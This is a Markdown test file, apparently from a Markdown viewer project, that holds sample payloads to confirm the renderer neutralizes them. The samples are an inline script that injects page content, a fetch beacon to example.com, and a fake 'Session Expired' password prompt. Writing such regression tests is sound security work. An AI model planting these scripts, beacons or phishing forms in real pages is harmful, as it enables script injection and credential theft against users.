# Malicious Markdown Demo (Educational)

This file demonstrates payload styles that are risky in unsanitized Markdown renderers.

In this project's current hardened build, these payloads are expected to be neutralized.

Use this only for local testing in this repository.

---

## 1) Inline script execution

If scripts are not blocked/sanitized, this can execute:

<script>
  document.body.insertAdjacentHTML(
    "afterbegin",
    "<p style='padding:10px;border:1px solid #c00;background:#fee;color:#900;font-weight:bold'>Injected script executed inside the viewer.</p>"
  );
  console.log("[demo] malicious markdown script executed");
</script>

## 2) Beacon/network callback

This demonstrates that the rendered page can make outbound requests:

<script>
  fetch("https://example.com/markdown-viewer-demo-beacon?ts=" + Date.now())
    .then(() => console.log("[demo] outbound request attempted"))
    .catch(() => console.log("[demo] outbound request blocked/failed"));
</script>

## 3) Deceptive UI content

Raw HTML can mimic trusted UI and trick users:

<div style="border:1px solid #d0d7de;border-radius:8px;padding:12px;background:#fffbe6;max-width:440px">
  <h3 style="margin:0 0 8px 0">Session Expired</h3>
  <p style="margin:0 0 10px 0">Please re-enter your password to continue.</p>
  <input type="password" placeholder="Password" style="width:100%;padding:8px;margin-bottom:8px" />
  <button style="padding:8px 12px">Sign in</button>
</div>

---

If this content executes as active HTML in the app, hardening has regressed and should be treated as a security bug.
